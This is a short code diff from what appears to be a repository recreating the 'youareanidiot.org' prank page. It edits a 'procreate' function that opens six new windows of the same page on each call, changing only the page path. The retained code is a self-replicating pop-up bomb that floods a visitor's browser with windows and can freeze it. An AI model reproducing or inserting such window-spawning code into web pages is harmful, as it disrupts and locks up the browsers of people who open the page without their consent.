@@ -11,12 +11,12 @@ function openWindow(url){
 }
 
 function procreate(){
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/source-code/open.html');
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/source-code/open.html');
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/source-code/open.html');
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/source-code/open.html');
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/source-code/open.html');
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/source-code/open.html');
+		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
+		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
+		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
+		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
+		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
+		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
 		}
 
 function newXlt(){
